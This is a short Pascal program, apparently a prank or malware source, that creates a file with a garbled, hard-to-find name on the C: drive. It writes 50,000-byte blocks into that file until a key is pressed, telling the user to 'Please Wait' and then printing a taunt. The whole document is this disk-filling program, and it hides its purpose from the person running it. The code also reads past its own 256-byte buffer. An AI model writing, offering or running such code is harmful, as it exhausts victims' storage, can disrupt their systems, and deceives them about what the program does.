program fill;

uses crt,dos;
var newfire:file;
    jennie:string;


var
NumRead, NumWritten: Word;
Buf: string;

begin
assign(newfire, 'c:\��ޑ.xx�'); { Open output file }
Rewrite(newfire, 1);  { Record size = 1 }
buf:=('������������������������������������������������������������');
writeln('Please Wait for a couple of minutes :)');
repeat

  BlockWrite(newfire, Buf, 50000, NumWritten);
until keypressed;
writeln('Har Har de har har har');

Close(newfire);
end.
